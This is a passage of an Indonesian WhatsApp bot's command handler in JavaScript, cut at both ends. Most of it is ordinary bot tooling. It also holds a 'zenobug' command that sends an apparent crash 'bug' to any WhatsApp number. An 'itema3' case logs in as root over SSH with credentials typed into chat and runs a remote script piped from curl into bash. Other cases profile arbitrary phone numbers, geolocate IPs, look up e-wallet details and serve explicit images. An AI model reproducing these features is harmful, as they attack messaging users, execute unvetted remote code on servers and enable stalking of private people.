                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('Sukses install tema.');
        }
    }, 300000);
   
}
break

case 'itema3': {
    if (!isOwner) return onlyOwn();
    
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix+command} ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    function Linecodes(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    const cmmnd = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'

    const conn = new Client();
    let isSuccess = false;

    conn.on('ready', () => {
        isSuccess = true;
        m.reply('Proses, mohon tunggu 5-10 menit');
        
        conn.exec(cmmnd, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                m.reply('Sukses install tema. Silahkan dicek')
                conn.end();
            }).on('data', (data) => {
                stream.write('0x1e7b2;\n');
                stream.write('1\n');
                stream.write('3\n');
                stream.write('\n');
                stream.write(sgc+'\n');
                stream.write(sgc+'\n');
                stream.write('yes\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            m.reply('Sukses install tema.');
        }
    }, 300000);
    
}
break

// === Nsfw Menu

case 'nsfw': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args[0] === 'on') {
if (db.data.chats[m.chat].nsfw) return m.reply(`Sudah aktif sebelumnya`)
db.data.chats[m.chat].nsfw = true
m.reply('Sukses mengaktifkan nsfw!')
} else if (args[0] === 'off') {
if (!db.data.chats[m.chat].nsfw) return m.reply(`Sudah nonaktifkan sebelumnya`)
db.data.chats[m.chat].nsfw = false
m.reply('Sukses menonaktifkan nsfw!')
} else {
m.reply(`Contoh: ${prefix+command} on/off`)
}}
break

case 'waifu':
case 'neko':
case 'shinobu':
case 'megumin':
case 'bully':
case 'cuddle':
case 'cry':
case 'hug':
case 'awoo':
case 'kiss':
case 'lick':
case 'pat':
case 'smug':
case 'bonk':
case 'yeet':
case 'blush':
case 'smile':
case 'wave':
case 'highfive':
case 'handhold':
case 'nom':
case 'bite':
case 'glomp':
case 'slap':
case 'kill':
case 'kick':
case 'happy':
case 'wink':
case 'poke':
case 'dance':
case 'cringe':
case 'trap':
case 'blowjob':
case 'hentai':
case 'boobs':
case 'ass':
case 'pussy':
case 'thighs':
case 'lesbian':
case 'lewdneko':
case 'cum': {
  if (!m.isGroup) return onlyGrup()
  if (!db.data.chats[m.chat].nsfw) return m.reply('Fitur Nsfw belum diaktifkan digrup ini')
  vreact
  try {
      let haha = await fetchJson(`https://rule34.xxx/index.php?page=dapi&s=post&q=index&tags=${command}&json=1`)
      if (haha && haha[0]?.file_url) {
      let imgUrl = haha[0].file_url
        Line.sendMessage(m.chat, {image: {url: imgUrl }, caption: global.wm }, {quoted: m })
      }
  } catch (err) {
  try {
      let atuh = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
      if (atuh.url) {
        Line.sendMessage(m.chat, {image: {url: atuh.url }, caption: global.wm }, {quoted: m })
      }
  } catch (err) {
      let sok = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
      if (sok.url) {
        Line.sendMessage(m.chat, {image: {url: sok.url }, caption: global.wm }, {quoted: m })
      }
  }}
}
break

// === Ephoto Menu

case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects': {
if (!text) return m.reply(`Contoh: ${prefix+command} Toyaa`)
vreact()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
try {
await Line.sendMessage(m.chat, {image: {url: haldwhd }, caption: global.wm }, {quoted: m })
} catch (err) {
m.reply('Terjadi Kesalahan')
}}
break

// === Cecan Menu

case 'hijaber':
case 'jeni':
case 'jiso':
case 'justina':
case 'rose':
case 'ryujin': {
vreact()
let asup = await fetchJson(`https://raw.githubusercontent.com/vreden/vreden-asupan/main/${command}.json`)
const url = await pickRandom(asup)
Line.sendMessage(m.chat, { image: { url: url }, caption: global.wm }, { quoted: m })
}
break

case 'china':
try {
const imageUrl = 'https://api.tioo.eu.org/china'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

case 'vietnam':
try {
const imageUrl = 'https://api.tioo.eu.org/vietnam'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

case 'thailand':
try {
const imageUrl = 'https://api.tioo.eu.org/thailand'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

case 'indonesia':
try {
const imageUrl = 'https://api.tioo.eu.org/indonesia'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

case 'korea':
try {
const imageUrl = 'https://api.tioo.eu.org/korea'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

case 'japan':
try {
const imageUrl = 'https://api.tioo.eu.org/japan'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

case 'malaysia':
try {
const imageUrl = 'https://api.tioo.eu.org/malaysia'; 
await Line.sendMessage(m.chat, {
image: { url: imageUrl },
caption: `© ${wm}`
}, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan.' }, { quoted: m });
}
break

// === Cogan Menu

case 'wuyifan':
case 'suga':
case 'parkchanyeol':
case 'ohsehun':
case 'luhan':
case 'kimtaehyung':
case 'kimsoek':
case 'kimnanjoon':
case 'kimminseok':
case 'kimjunmyeon':
case 'kimjong':
case 'kimjondae':
case 'jungkook':
case 'jimin':
case 'jhope':
case 'huangzitao':
case 'dohkyungsoo':
case 'baekhyung': {
vreact()
let cogan = await getBuffer(`https://api.zeeoneofc.my.id/api/cogan/${command}?apikey=${global.onekey}`)
await Line.sendMessage(m.chat, {image: cogan, caption: global.wm }, {quoted: m })
}
break

// === Tools Menu

case 'to64':
case 'tobase64': {
if (!text) return m.reply(`Contoh: ${prefix+command} teksnya`)
const base = await toBase64(text)
reply(base)
}
break

case 'tocharcode': {
if (!text) return m.reply(`Contoh: ${prefix + command} teksnya`);    
const charCodes = text.split("").map(char => char.charCodeAt(0));
const result = `String.fromCharCode(${charCodes.join(", ")})`;
reply(result);
}
break

case 'toutf':
case 'toori': {
if (!text) return m.reply(`Contoh: ${prefix+command} teksnya`)
const ori = await toOriginal(text)
reply(ori)
}
break

case 'enc':
case 'encrypt':
case 'obfus':
case 'obfuscate': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kutip pesan dokumen!')
try {
vreact()
const fileName = m.quoted.fileName;
if (!fileName.endsWith('.js') && !fileName.endsWith('.json')) {
return m.reply('Kutip pesan dokumen, js dan json!')}
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])}
let originalCode = buffer.toString('utf-8')
let obfuscationResult = await obfus1(originalCode)
const obfuscatedFileName = `obfuscated_${fileName}`
const obfuscatedFilePath = path.join(__dirname, obfuscatedFileName)
fs.writeFileSync(obfuscatedFilePath, obfuscationResult.result)
const fileBuffer = fs.readFileSync(obfuscatedFilePath)
Line.sendMessage(m.chat, {document: fileBuffer, caption: `Hasil obfuscation dari ${fileName}`, mimetype: fileName.endsWith('.js') ? 'application/js' : 'application/json', fileName: fileName }, {quoted: m })
await fs.unlinkSync(obfuscatedFilePath)
} catch (err) {
console.error('Terjadi kesalahan:', err)}
}
break

case 'enc2':
case 'encrypt2':
case 'obfus2':
case 'obfuscate2': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kutip pesan dokumen!')
try {
vreact()
const fileName = m.quoted.fileName;
if (!fileName.endsWith('.js') && !fileName.endsWith('.json')) {
return m.reply('Kutip pesan dokumen, js dan json!')}
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])}
let originalCode = buffer.toString('utf-8')
let obfuscationResult = await obfus2(originalCode)
const obfuscatedFileName = `obfuscated_${fileName}`
const obfuscatedFilePath = path.join(__dirname, obfuscatedFileName)
fs.writeFileSync(obfuscatedFilePath, obfuscationResult.result)
const fileBuffer = fs.readFileSync(obfuscatedFilePath)
Line.sendMessage(m.chat, {document: fileBuffer, caption: `Hasil obfuscation dari ${fileName}`, mimetype: fileName.endsWith('.js') ? 'application/js' : 'application/json', fileName: fileName }, {quoted: m })
await fs.unlinkSync(obfuscatedFilePath)
} catch (err) {
console.error('Terjadi kesalahan:', err)}
}
break

case 'noenc':
case 'decrypt':
case 'deobfus': {
if (!text) return m.reply(`Contoh: ${prefix+command} teksnya`)
const noenc = await deobfusc(text)
reply(noenc)
}
break

case 'rawgh':
case 'raw':
case 'toraw': {
if (!text) return m.reply(`Contoh: ${prefix+command} link github format ori`)
if (!text.includes('github.com')) return m.reply('Harus berupa link github ori!')
const raw = await toGhRaw(text)
reply(raw)
}
break

case 'togh':
case 'togithub': {
if (!text) return m.reply(`Contoh: ${prefix+command} link github format raw`)
if (!text.includes('raw.githubusercontent')) return m.reply('Harus berupa link github format raw!')
const gh = await toGhOri(text)
reply(gh)
}
break

case 'nuliskanan': {
  if (!text) return m.reply(`Contoh: ${p_c} toyaa`)
  try {
    vreact()
    Line.sendMessage(m.chat, {
      image: {
        url: `https://api.siputzx.my.id/api/m/nulis?text=${text}&name=${db.data.users[m.sender].nama}&class=`
      },
      caption: global.wm
    }, {
      quoted: m
    })
  } catch {
    m.reply('Terjadi kesalahan: ' + err.toString())
  }
}
break

case 'nuliskiri': {
  if (!text) return m.reply(`Contoh: ${p_c} toyaa`)
  try {
    vreact()
    const p = await fetchJson(`https://api.neoxr.eu/api/nulis?text=${text}&apikey=ViooS`)
    Line.sendMessage(m.chat, {
      image: {
        url: p.data.url
      },
      caption: global.wm
    }, {
      quoted: m
    })
  } catch {
    m.reply('Terjadi kesalahan: ' + err.toString())
  }
}
break

case 'foliokanan': {
  if (!text) return m.reply(`Contoh: ${p_c} toyaa`)
  try {
    vreact()
    Line.sendMessage(m.chat, {
      image: {
        url: `https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${text}&apikey=${global.onekey}`
      },
      caption: global.wm
    }, {
      quoted: m
    })
  } catch {
    m.reply('Terjadi kesalahan: ' + err.toString())
  }
}
break

case 'foliokiri': {
  if (!text) return m.reply(`Contoh: ${p_c} toyaa`)
  try {
    vreact()
    Line.sendMessage(m.chat, {
      image: {
        url: `https:\/\/api.zeeoneofc.my.id/api/canvas/${command}?text=${text}&apikey=${global.onekey}`
      },
      caption: global.wm
    }, {
      quoted: m
    })
  } catch {
    m.reply('Terjadi kesalahan: ' + err.toString())
  }
}
break

case 'beauty': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kutip pesan dokumen!')
try {
vreact()
const fileName = m.quoted.fileName
if (!fileName.endsWith('.js') && !fileName.endsWith('.json')) {
return m.reply('Kutip pesan dokumen, js dan json!')}
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])}
let originalCode = buffer.toString('utf-8')
let bResult = await rapihin(originalCode)
const bFileName = `beauty_${fileName}`
const bFilePath = path.join(__dirname, bFileName)
fs.writeFileSync(bFilePath, bResult)
const fileBuffer = fs.readFileSync(bFilePath)
Line.sendMessage(m.chat, {document: fileBuffer, caption: `Hasil beauty dari ${fileName}`, mimetype: fileName.endsWith('.js') ? 'application/js' : 'application/json', fileName: fileName }, {quoted: m })
await fs.unlinkSync(bFilePath)
} catch (err) {
console.error('Terjadi kesalahan:', err)}
}
break

case 'flatten': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kutip pesan dokumen!')
try {
vreact()
const fileName = m.quoted.fileName
if (!fileName.endsWith('.js') && !fileName.endsWith('.json')) {
return m.reply('Kutip pesan dokumen, js dan json!')}
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])}
let originalCode = buffer.toString('utf-8')
let bResult = await rapihin2(originalCode)
const bFileName = `beauty_${fileName}`
const bFilePath = path.join(__dirname, bFileName)
fs.writeFileSync(bFilePath, bResult)
const fileBuffer = fs.readFileSync(bFilePath)
Line.sendMessage(m.chat, {document: fileBuffer, caption: `Hasil flatten dari ${fileName}`, mimetype: fileName.endsWith('.js') ? 'application/js' : 'application/json', fileName: fileName }, {quoted: m })
await fs.unlinkSync(bFilePath)
} catch (err) {
console.error('Terjadi kesalahan:', err)}
}
break

case 'dnslookup': 
if (!text) return reply(`Masukkan Domain/Sub Domain! 😕\n\n*Contoh:* s.id`) 
if (text.includes("https://") || text.includes("http://")) throw `Tolong masukkan domain/sub domain secara lengkap. Contoh: s.id`;
  await m.reply("⌛ Mohon tunggu sebentar ya...");
try {
const output = await convertRecords(text);
await m.reply(`📋 *DNS Lookup Results:*\n${output}`);
  } catch (error) {
console.log(error);
await m.reply("❌ Terjadi kesalahan saat melakukan pencarian DNS.");
}
break

case 'cekip':
if (!args[0]) return reply('Contoh: .cekip 8.8.8.8');
const ip = args[0];
try {
const axios = require('axios');
const res = await axios.get(`https://lineaja.my.id/api/tools/cekip?ip=${ip}`);
if (!res.data || !res.data.status || res.data.data.status !== 'success') {
return reply(`Alamat IP tidak valid atau tidak ditemukan: ${ip}`);
}
const { query, country, regionName, city, zip, lat, lon, isp, org } = res.data.data;
const message = `*Informasi Alamat IP*\n\n` +
`• Alamat IP: ${query}\n` +
`• Negara: ${country || 'Tidak tersedia'}\n` +
`• Wilayah: ${regionName || 'Tidak tersedia'}\n` +
`• Kota: ${city || 'Tidak tersedia'}\n` +
`• Kode Pos: ${zip || 'Tidak tersedia'}\n` +
`• Latitude: ${lat || 'Tidak tersedia'}\n` +
`• Longitude: ${lon || 'Tidak tersedia'}\n` +
`• ISP: ${isp || 'Tidak tersedia'}\n` +
`• Organisasi: ${org || 'Tidak tersedia'}`;
reply(message);
} catch (err) {
console.error('Error saat memproses data:', err.message);
reply('Terjadi kesalahan saat melacak alamat IP. Coba lagi nanti.');
}
break

case 'zenobug': {
try {
if (!args[0]) return m.reply(`Contoh penggunaan: ${prefix + command} 628xxxxx`);
const target = args[0].includes('@s.whatsapp.net') ? args[0] : `${args[0]}@s.whatsapp.net`;
const isPtpc = args[1] && args[1].toLowerCase() === 'true'; 
await heranibos(target, isPtpc);
m.reply(`🗡 Zeno Bug telah dikirim ke: ${args[0]}`);
} catch (err) {
console.error(err);
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'cimg': { 
try {
if (!text) return m.reply(`Contoh: ${prefix + command} prompt\nExample: .cing a cute cat`);
await vreact();
const cimg = async (text) => {
try {
const response = await axios.get(`https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`);
const imageUrl = response.request.res.responseUrl; 
return imageUrl;
} catch (error) {
console.error(error);
return null;
}
};
const imageUrl = await cimg(text);
if (!imageUrl) {
return m.reply(`Gagal mengambil gambar, coba lagi.`);
}
Line.sendMessage(m.chat, { 
image: { url: imageUrl }, 
caption: `Gambar Dari prompt: ${text}\n© ${wm}`
}, { quoted: m });
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'dictionary': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} apple`);
await vreact();
const response = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`);
const word = response.data[0];
const definition = word.meanings[0].definitions[0].definition;
const example = word.meanings[0].definitions[0].example || 'Tidak ada contoh';
const caption = `📖 *Kamus*\n\n*Kata*: ${word.word}\n*Definisi*: ${definition}\n*Contoh*: ${example}`;
m.reply(caption);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'remind': {
try {
const [time, ...reminder] = text.split(' ');
if (!time || reminder.length === 0) return m.reply(`Contoh: ${prefix + command} 10m Minum air!`);
const duration = parseInt(time.match(/\d+/)[0]);
const unit = time.match(/[smhd]/)?.[0];
const milliseconds = unit === 's' ? duration * 1000 :
unit === 'm' ? duration * 60000 :
unit === 'h' ? duration * 3600000 :
unit === 'd' ? duration * 86400000 : null;
if (!milliseconds) return m.reply('Format waktu tidak valid! Gunakan s/m/h/d untuk detik, menit, jam, atau hari.');
m.reply(`Pengingat diatur: ${reminder.join(' ')} dalam ${time}.`);
setTimeout(() => {
m.reply(`⏰ *Pengingat:*\n\n${reminder.join(' ')}`);
}, milliseconds);
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}
}
break

case 'age': {
try {
if (!text) return m.reply(`Contoh: ${prefix + command} 1990-01-01`);
const birthDate = new Date(text);
const today = new Date();
const age = today.getFullYear() - birthDate.getFullYear();
const month = today.getMonth() - birthDate.getMonth();
const day = today.getDate() - birthDate.getDate();
m.reply(`Umur Anda: ${age} tahun, ${month} bulan, ${day} hari`);
} catch (err) {
m.reply(`Terjadi kesalahan: Format tanggal tidak valid.`);
}
}
break

case 'wallet':
if (!text) {
return reply('Contoh: .wallet 0856xxxx');
}
const result = await getEwalletInfo(text);
return reply(result);
break

case 'proxy':
if (!args[0]) return reply('Harap masukkan URL yang ingin diakses melalui proxy, contoh: .proxy https://google.com') 
const targetUrl = args[0];
const proxyUrl = `https://api.tioo.eu.org/proxy?url=${encodeURIComponent(targetUrl)}`;
try {
const response = await fetch(proxyUrl);
if (!response.ok) throw new Error('Gagal mengakses halaman melalui proxy.');
const htmlContent = await response.text(); 
const maxLength = 10000; 
const resultMessage = htmlContent.length > maxLength ? htmlContent.slice(0, maxLength) + '...\n\n[Konten Terpotong]' : htmlContent;
await Line.sendMessage(m.chat, { text: `🔗 Konten dari ${targetUrl} melalui proxy:\n\n${resultMessage}` }, { quoted: m });
} catch (error) {
await Line.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengakses halaman melalui proxy.' }, { quoted: m });
}
break
case 'subfinder':
  if (!text) return reply(`Format salah!\nGunakan:\n.subfinder domain.com\nContoh: .subfinder example.com`);
const domain = text;
try {
const response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${global.domain}`);
const subdomains = response.data.data.map((subdomain) => subdomain).join('\n');
Line.sendMessage(
m.chat,
{
text: `*Subdomain Finder*\nDitemukan untuk: ${global.domain}\n\n${subdomains}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: global.title || 'Subdomain Finder',
body: 'Massive Scraper',
mediaType: 1,
renderLargerThumbnail: true,
thumbnailUrl: global.thumb2 || '',
sourceUrl: ''
}
}
},
{ quoted: m }
);
} catch (e) {
reply('Terjadi kesalahan saat memproses permintaan Anda.')
console.error(e)
}
break

case 'trackip': {
if (!text) return m.reply(`[!] *Input salah*\n\nContoh: ${prefix + command} 123.456.789.0`);
}

try {
const ipInfo = await getIPInfo(text);
if (ipInfo) {
const ipDetails = `
*Ip*: ${ipInfo.ip}
*Hostname*: ${ipInfo.hostname}
*City*: ${ipInfo.city}
*Region*: ${ipInfo.region}
*Country*: ${ipInfo.country}
*Loc*: ${ipInfo.loc}
*Org*: ${ipInfo.org}
*Postal*: ${ipInfo.postal}
*Timezone*: ${ipInfo.timezone}

*Location*: ${ipInfo.loc}
*Coordinates*: ${ipInfo.loc}
`;
m.reply(ipDetails);
} else {
m.reply("[!] Tidak ada informasi yang ditemukan untuk IP tersebut.");
}
} catch (error) {
console.error(error);
m.reply("[!] Terjadi kesalahan saat mengakses informasi IP.");
}
break

case 'wastalk': {
let num = m.quoted?.sender || m.mentionedJid?.[0] || text
if (!num) return m.reply(`Ex: ${prefix + command} @tag / 628xxx`)
num = num.replace(/\D/g, '') + '@s.whatsapp.net'
if (!(await Line.onWhatsApp(num))[0]?.exists) throw 'User not exists'
let img = await Line.profilePictureUrl(num, 'image').catch(_ => './lib/avatar_contact.png')
let bio = await Line.fetchStatus(num).catch(_ => { })
let name = await Line.getName(num)
let business = await Line.getBusinessProfile(num)
let format = new PhoneNumber(`+${num.split('@')[0]}`)
let country = regionNames.of(format.getRegionCode())
let wea = `\t\t\t\t*▾ WHATSAPP ▾*\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `\t\t\t\t*▾ INFO BUSINESS ▾*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timezone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Description :* ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
if (img) {
await Line.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m })
} else {
m.reply(wea)
}
}
break

case 'addwm': {
if (!text) return m.reply(`Contoh: ${prefix+command} Line`)
if (!quoted || !quoted.mimetype || !/image/.test(quoted.mimetype)) {
return m.reply('Kirimkan gambar dengan perintah ini!')
}
let media = await Line.downloadAndSaveMediaMessage(quoted)
vreact()
const outputPath = `./lib/${path.basename(media, path.extname(media))}_watermarked${path.extname(media)}`
const watermarkText = text
await addWm(media, watermarkText, outputPath)
Line.sendFile(m.chat, outputPath, 'watermarked.jpg', 'Ini adalah gambar dengan watermark', m)
await fs.unlinkSync(media)
await fs.unlinkSync(outputPath)
}
break

case 'cfps': {
if (!/video/.test(mime)) {
return m.reply(`Kirim/kutip video dengan caption ${command}`)
}
if (!args[0]) return m.reply(`Contoh: ${command} 60`)
vreact()
let qw = m.quoted ? quoted : m
let media = await Line.downloadAndSaveMediaMessage(qw)   
try {
const originalFPS = await detekFps(media)
const targetFPS = args[0]
await ubahFps(media, "./lib/undefined2.mp4", targetFPS)
await Line.sendMessage(m.chat, {
video: fs.readFileSync("./lib/undefined2.mp4"),
caption: `Video ini diubah ke ${targetFPS} FPS, FPS asli: ${originalFPS}`
}, {
quoted: m
})
} catch (error) {
console.error('Error:', error)
m.reply('Terjadi kesalahan: '+error)
} finally {
if (fs.existsSync(media)) fs.unlinkSync(media)
if (fs.existsSync("./lib/undefined2.mp4")) fs.unlinkSync("./lib/undefined2.mp4")
}
}
break

case 'setspeed': {
if (!/video/.test(mime)) {
return m.reply(`Kirim/kutip video dengan caption ${command}`)
}
if (!args[0]) return m.reply(`Contoh: ${command} 1.5x`)
vreact()
let qw = m.quoted ? quoted : m
let media = await Line.downloadAndSaveMediaMessage(qw)
try {
const outputPath = './lib/speed_video.mp4'
const kecepatan = args[0]
await speedVideo(media, outputPath, kecepatan)
await Line.sendMessage(m.chat, {
video: fs.readFileSync(outputPath),
caption: `Video berhasil diubah ke kecepatan ${kecepatan}!`
}, {
quoted: m
})
} catch (error) {
console.error('Error:', error)
m.reply('Terjadi kesalahan: ' + error)
} finally {
if (fs.existsSync(media)) fs.unlinkSync(media)
if (fs.existsSync('./lib/speed_video.mp4')) fs.unlinkSync('./lib/speed_video.mp4')
}
}
break

case 'totxt': {
if (!/audio/.test(mime) && !/ogg/.test(mime)) return m.reply(`Kutip audio dengan caption ${command}`)
try {
let qw = m.quoted ? m.quoted : m
let media = await Line.downloadAndSaveMediaMessage(qw)
let yop = await audio2txt(media)
m.reply(yop)
} catch (err) {
console.error(err)
m.reply('Terjadi kesalahan saat memproses audio.')
}
} 
break

case 'npms':
case 'npmsearch': {
if (!text) return m.reply(`Contoh ${command} nama package`)
let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
let { objects } = await res.json()
if (!objects.length) return m.reply('Tidak ditemukan')
let txt = objects.map(({ package: pkg }) => {
return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
}).join`\n\n`
m.reply(txt)
}
break

case 'lirik':
case 'liriklagu': {
if (!text) return m.reply(`Contoh: ${command} laskar pelangi`)
try {
let sik = await fetchJson(`https://itzpire.com/search/lyrics?query=${encodeURIComponent(text)}`)
let cak = sik.data
let teks = `••••>>   *${cak.title.toUpperCase()}\n\n••••>>   *LIRIK*   <<••••\n\n${cak.lyrics}\n\n© *${cak.album}*`
await Line.sendMessage(m.chat, {image: {url: `${cak.thumb}` }, caption: teks }, {quoted: m})
} catch (err) {
m.reply('Terjadi kesalahan: '+err)
}
}
break

case 'chord': {
if (!text) {
return m.reply(`Contoh: ${prefix + command} laskar pelangi`);
}
try {
